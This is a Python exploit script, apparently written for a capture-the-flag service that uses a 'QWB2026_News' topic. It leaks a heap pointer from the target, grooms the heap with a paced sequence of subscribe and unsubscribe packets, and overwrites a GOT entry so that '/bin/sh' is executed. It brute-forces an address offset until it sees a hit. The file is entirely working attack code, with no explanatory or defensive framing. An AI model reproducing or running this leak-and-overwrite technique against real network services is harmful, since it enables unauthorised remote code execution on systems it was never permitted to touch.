import socket, struct, time, sys, os
import probe3 as P
LO=int(sys.argv[3],16); HI=int(sys.argv[4],16); STEP=int(sys.argv[5],16)
def probe(D):
    try:
        return _probe(D)
    except Exception as e:
        return 'ERR'
def _probe(D):
    try: s=socket.create_connection((P.HOST,P.PORT),10)
    except Exception: return 'CONN'
    s.sendall(P.build_leak()); time.sleep(2.0)
    buf=P.rd(s,1.2)
    i=buf.find(b'\x34\x2e\x00\x0cQWB2026_News'); leak=None
    if i>=0 and len(buf)>=i+2+0x2e:
        bd=buf[i+2:i+2+0x2e]; tl=struct.unpack('>H',bd[0:2])[0]
        pl=bd[2+tl+2:]
        if len(pl)>=8: leak=struct.unpack('>Q',pl[:8])[0]
    if not leak: s.close(); return 'LEAK'
    BASE=leak-P.BIN2HEAP
    val=BASE+D+P.PUTS_OFF
    o=P.subb('/bin/sh')+P.subb('d1xx')+P.subb('d2xx')+P.subb('Xx')+P.subb('Yy')+P.subb('Z'*400)
    o+=P.unsubb('Yy')+P.unsubb('Xx')
    pl2=bytearray(b'A'*272); pl2[24:32]=struct.pack('>Q',0x21); pl2[32:40]=struct.pack('>Q',(BASE+P.GOT_OFF)-16)
    o+=P.subb(raw=0xFFFF,pl=bytes(pl2))+P.subb('AAAA')+P.subb(struct.pack('>Q',val))
    for p in o and [o[i:i+1] for i in range(0)]: pass
    # send packet by packet (paced) to avoid burst drops
    for p in [P.subb('/bin/sh'),P.subb('d1xx'),P.subb('d2xx'),P.subb('Xx'),P.subb('Yy'),P.subb('Z'*400),
              P.unsubb('Yy'),P.unsubb('Xx'),
              P.subb(raw=0xFFFF,pl=bytes(pl2)),P.subb('AAAA'),P.subb(struct.pack('>Q',val))]:
        s.sendall(p); time.sleep(0.12)
    s.sendall(P.unsubb('/bin/sh')); time.sleep(2.5)
    out=P.rd(s,2.0); s.close()
    if b'/bin/sh' in out: return 'HIT %#x' % (BASE+D)
    n=out.count(b'\x90\x03\x00\x01\x01')
    return 'miss' if n>=9 else 'flaky'
D=LO; t0=time.time(); n=0
while D<=HI:
    r=probe(D)
    if r in ('flaky','LEAK','CONN','ERR'):   # retry once on flake
        r=probe(D)
    if r.startswith('HIT'):
        print('*** HIT', r, flush=True); break
    n+=1
    if r!='miss' or n%16==0:
        print('%#x %s  [%d/%d, %ds]'%(D,r,n,(HI-LO)//STEP+1,int(time.time()-t0)), flush=True)
    D+=STEP
print('done', flush=True)
